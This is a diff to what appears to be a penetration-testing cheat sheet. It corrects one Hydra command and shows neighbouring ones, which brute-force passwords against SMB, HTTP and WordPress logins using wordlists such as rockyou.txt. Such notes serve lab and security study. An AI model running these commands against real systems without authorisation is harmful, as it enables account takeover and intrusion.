@@ -24,7 +24,7 @@ hydra -t 1 -V -f -l administrator -P rockyou.txt $ip smb 		# Hydra brute force S
 hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip -s $port -f http-get / 
 
 # Hydra brute force a Wordpress admin login
-hydra -l username -P wordlist.txt -f 10.10.71.232 http-post-form "/login.php/:username=^USER^&password=^PASS^:F=incorrect" # READ THE SOURCE
+hydra -l username -P wordlist.txt -f 10.10.71.232 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" # READ THE SOURCE
 hydra -l admin -P ./passwordlist.txt $ip -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' 
 
 hydra -L usernames.txt -P passwords.txt $ip smb -V -f 			# SMB Brute Forcing
